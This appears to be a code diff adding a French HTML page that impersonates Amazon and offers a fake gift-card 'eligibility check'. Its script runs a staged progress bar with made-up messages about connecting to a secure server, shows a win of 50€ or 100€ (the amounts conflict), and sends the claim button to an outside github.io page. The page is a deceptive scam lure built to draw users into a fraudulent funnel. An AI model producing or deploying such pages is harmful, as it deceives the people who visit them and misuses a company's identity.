@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Vérification d'Éligibilité</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #f8f8f8, #e0e0e0);
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease-in-out;
+        }
+        .container:hover {
+            transform: translateY(-10px);
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+            transition: transform 0.3s;
+        }
+        .logo:hover {
+            transform: scale(1.1);
+        }
+        input, .btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        .btn {
+            background-color: #ff9900;
+            color: white;
+            border: none;
+            cursor: pointer;
+            display: block;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .btn:hover:enabled {
+            background-color: #e68900;
+        }
+        .loading, .success {
+            display: none;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 20px;
+            background-color: #ff9900;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #ff9900;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        footer {
+            margin-top: 50px;
+            background-color: #ff9900;
+            color: white;
+            padding: 10px 0;
+        }
+        footer p {
+            font-size: 14px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="step1">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
+        <h2>Vérifiez votre éligibilité</h2>
+        <p>Entrez votre pays pour voir si vous êtes éligible à une carte cadeau.</p>
+        
+        <input type="text" id="countryInput" placeholder="Entrez votre pays..." required>
+
+        <button class="btn" id="checkButton" disabled>Vérifier mon éligibilité</button>
+    </div>
+
+    <div class="container" id="step2" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
+        <h2>Vérification en cours...</h2>
+        <div class="loader"></div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <p id="progressText">Analyse de votre éligibilité...</p>
+    </div>
+
+    <div class="container" id="step3" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
+        <div class="success">
+            🎉 Félicitations ! Vous êtes éligible à une carte cadeau Amazon de 50€ !
+        </div>
+        <button class="btn" id="claimButton">Réclamer ma carte 🎁</button>
+    </div>
+
+    <footer>
+        <p>Obtenez une carte cadeau Amazon de 100€ ! 🎉</p>
+        <p>Êtes-vous prêt à découvrir si vous êtes éligible à une carte cadeau Amazon exclusive ? Il vous suffit de quelques secondes pour entrer votre pays et lancer la vérification.</p>
+    </footer>
+
+    <div class="container">
+        <p>1. Vérification rapide : Entrez simplement votre pays et laissez notre système vérifier votre éligibilité.</p>
+        <p>2. Chargement en temps réel : Suivez l’évolution de votre vérification avec notre barre de progression dynamique.</p>
+        <p>3. Récompense instantanée : Si vous êtes éligible, vous recevrez une carte cadeau Amazon de 100€ !</p>
+        <p>Ne manquez pas cette occasion unique de recevoir une récompense Amazon. Cliquez maintenant et commencez votre vérification !</p>
+    </div>
+
+    <script>
+        document.getElementById("countryInput").addEventListener("input", function() {
+            let checkButton = document.getElementById("checkButton");
+            checkButton.disabled = this.value.trim() === "";
+        });
+
+        document.getElementById("checkButton").addEventListener("click", function() {
+            document.getElementById("step1").style.display = "none";
+            document.getElementById("step2").style.display = "block";
+            document.querySelector(".progress-container").style.display = "block";
+
+            let progress = 0;
+            let progressBar = document.getElementById("progressBar");
+            let progressText = document.getElementById("progressText");
+
+            let interval = setInterval(function() {
+                progress += 10;
+                progressBar.style.width = progress + "%";
+                if (progress === 30) progressText.innerText = "Connexion au serveur sécurisé...";
+                if (progress === 60) progressText.innerText = "Analyse de votre éligibilité...";
+                if (progress === 90) progressText.innerText = "Finalisation...";
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(function() {
+                        document.getElementById("step2").style.display = "none";
+                        document.getElementById("step3").style.display = "block";
+                    }, 500);
+                }
+            }, 500);
+        });
+
+        document.getElementById("claimButton").addEventListener("click", function() {
+            window.location.href = "https://maxwelldubuzz.github.io/Amazon-Gift-Card/";
+        });
+    </script>
+
+    <footer>
+        <p>&copy; 2025 Amazon Gift Card Project - <a href="#">www.amazon.com</a></p>
+    </footer>
+
+</body>
+</html>
+</html>
